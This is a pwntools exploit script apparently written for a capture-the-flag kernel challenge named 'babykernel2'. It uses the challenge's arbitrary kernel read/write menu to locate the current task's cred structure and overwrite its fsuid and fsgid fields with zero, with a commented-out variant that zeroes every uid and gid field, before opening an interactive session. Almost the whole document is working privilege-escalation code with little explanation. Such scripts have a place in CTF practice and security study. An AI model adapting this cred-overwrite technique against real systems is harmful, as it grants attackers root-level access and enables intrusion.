from pwn import *


p = remote('babykernel2.forfuture.fluxfingers.net', 1337)
p.recvuntil('----- Menu -----\r')
p.recvuntil('> ')

# ffffffff8183a040 D current_task
def read(addr):
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(hex(addr))
    p.recvuntil("We're back. Our scouter says the power level is: ")
    rcv = p.recvuntil('\r', drop=True)
    return rcv

current_task_ptr = 0xffffffff8183a040

current_task = int(read(current_task_ptr), 16)

# Dumped from `gdb ./vmlinux` -> `ptype /o struct task_struct`:
# /* 1008      |     8 */    const struct cred *ptracer_cred;
# /* 1016      |     8 */    const struct cred *real_cred;
# /* 1024      |     8 */    const struct cred *cred;

real_cred = int(read(current_task + 1016), 16)
cred = int(read(current_task + 1024), 16)

log.info("cred=0x%x, real_cred=0x%x" % (cred, real_cred))

# pwndbg> ptype /o struct cred
# /* offset    |  size */  type = struct cred {
# /*    0      |     4 */    atomic_t usage;
# /*    4      |     4 */    kuid_t uid;
# /*    8      |     4 */    kgid_t gid;
# /*   12      |     4 */    kuid_t suid;
# /*   16      |     4 */    kgid_t sgid;
# /*   20      |     4 */    kuid_t euid;
# /*   24      |     4 */    kgid_t egid;
# /*   28      |     4 */    kuid_t fsuid;
# /*   32      |     4 */    kgid_t fsgid;

uid_gid = read(cred+4)
uid_gid_real = read(real_cred+4)

# Lets overwrite &uid_gid (aka cred+4) EDIT: or actually fsuid and fsgid only!
# Seems like only those two are required here
log.info("Setting cred->fsuid and cred->fsgid to 0")
p.sendline('2')
p.recvuntil('> ')
p.sendline(hex(cred+4 + 8*3))
p.recvuntil('> ')
p.sendline(hex(0))
p.recvuntil('> ')

# This method also works and it sets uid/gid/suid/sgid/euid/egid/fsuid/fsgid to 0:
#log.info("Setting cred->uid/gid/suid/sgid/euid/egid/fsuid/fsgid=0")
#for i in range(4):
#    p.sendline('2')
#    p.recvuntil('> ')
#    p.sendline(hex(cred+4 + 8*i))
#    p.recvuntil('> ')
#    p.sendline(hex(0))
#    p.recvuntil('> ')
p.interactive()
